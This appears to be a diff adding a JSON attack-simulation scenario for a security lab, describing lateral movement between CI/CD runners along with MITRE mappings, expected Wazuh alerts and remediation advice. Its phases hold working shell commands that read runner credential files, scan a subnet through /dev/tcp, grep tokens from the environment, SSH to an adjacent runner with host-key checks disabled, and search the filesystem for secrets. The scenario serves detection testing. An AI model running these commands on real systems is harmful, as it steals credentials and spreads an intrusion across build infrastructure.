@@ -1,0 +1,160 @@
+{
+  "id": "S9-04",
+  "name": "Runner-to-Runner Lateral Movement",
+  "category": "Supply Chain",
+  "version": "1.0",
+  "description": "Attacker pivots from a compromised CI/CD runner to other runners in the fleet by exploiting shared secrets, network adjacency, and runner registration tokens",
+  "difficulty": "Hard",
+  "real_world_relevance": "CircleCI January 2023 breach involving compromised runner fleet, GitHub Actions self-hosted runner attacks, Jenkins agent lateral movement via shared credentials",
+
+  "mitre_attack": {
+    "tactics": ["Lateral Movement", "Credential Access"],
+    "techniques": [
+      {"id": "T1021", "name": "Remote Services"},
+      {"id": "T1552.001", "name": "Credentials in Files"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["cicd-runner", "mock-cicd"],
+    "network": "cloud_net",
+    "profile": "cicd"
+  },
+
+  "attack_flow": {
+    "description": "Attacker uses credentials and network access from one compromised runner to access other runners and their secrets",
+    "diagram": [
+      "1. Attacker compromises a single CI/CD runner",
+      "2. Discovers shared secrets (runner registration token, SSH keys)",
+      "3. Enumerates network for other runner instances",
+      "4. Uses shared credentials to access adjacent runners",
+      "5. Harvests unique secrets from each compromised runner",
+      "6. Establishes persistent access across the runner fleet"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "Runner Environment Enumeration",
+      "description": "Map the runner fleet and discover shared resources",
+      "critical": false,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "cat /runner/.runner 2>/dev/null || cat /runner/config.toml 2>/dev/null || echo 'No runner config found'",
+          "description": "Read runner registration configuration"
+        },
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "cat /runner/.credentials 2>/dev/null || echo 'No runner credentials file'",
+          "description": "Access runner credential store"
+        }
+      ]
+    },
+    {
+      "name": "Network Reconnaissance",
+      "description": "Discover other runners on the network",
+      "critical": false,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "for ip in $(seq 1 20); do (echo >/dev/tcp/172.41.0.$ip/8080 2>/dev/null && echo \"Runner found at 172.41.0.$ip\") & done; wait 2>/dev/null || echo 'Network scan complete'",
+          "description": "Scan for other runner instances on the network"
+        },
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "curl -s http://mock-cicd:8080/api/v1/runners 2>/dev/null || echo 'Cannot enumerate runners via API'",
+          "description": "Query CI/CD API for registered runners"
+        }
+      ]
+    },
+    {
+      "name": "Lateral Movement via Shared Secrets",
+      "description": "Use discovered credentials to access other runners",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "cat /runner/.credentials 2>/dev/null; cat /runner/_work/_temp/.runner_token 2>/dev/null; env | grep -i RUNNER_TOKEN 2>/dev/null || echo 'No shared runner tokens found'",
+          "description": "Extract runner registration tokens for fleet access"
+        },
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 runner@172.41.0.15 'env | grep TOKEN' 2>&1 || echo 'SSH lateral movement attempted'",
+          "description": "Attempt SSH lateral movement to adjacent runner"
+        }
+      ]
+    },
+    {
+      "name": "Secret Harvesting Across Runners",
+      "description": "Collect unique secrets from each compromised runner",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "find / -name '.credentials' -o -name '*.token' -o -name 'runner_token' 2>/dev/null | head -10",
+          "description": "Harvest credentials across runner filesystem"
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "Network",
+      "description": "Unusual inter-runner network communication",
+      "wazuh_rule": "100984"
+    },
+    {
+      "type": "CI/CD Logs",
+      "description": "Shared secret accessed by unexpected runner",
+      "wazuh_rule": "100985"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "100984",
+      "level": 12,
+      "description": "NHI: Unusual inter-runner network communication"
+    },
+    {
+      "rule_id": "100985",
+      "level": 14,
+      "description": "NHI: Shared secret accessed by unexpected runner"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Isolate compromised runners from the network",
+      "Rotate all runner registration tokens and shared secrets",
+      "Audit all pipeline runs executed during the compromise window"
+    ],
+    "long_term": [
+      "Use ephemeral runners that are destroyed after each job",
+      "Implement network segmentation between runners",
+      "Use unique, scoped secrets per runner (no shared credentials)",
+      "Enable runner audit logging and anomaly detection",
+      "Implement just-in-time runner registration (GitHub: JIT runners)"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "CircleCI Security Incident Report (January 2023)",
+      "url": "https://circleci.com/blog/jan-4-2023-incident-report/"
+    },
+    {
+      "title": "GitHub Self-Hosted Runner Security",
+      "url": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners#self-hosted-runner-security"
+    }
+  ]
+}
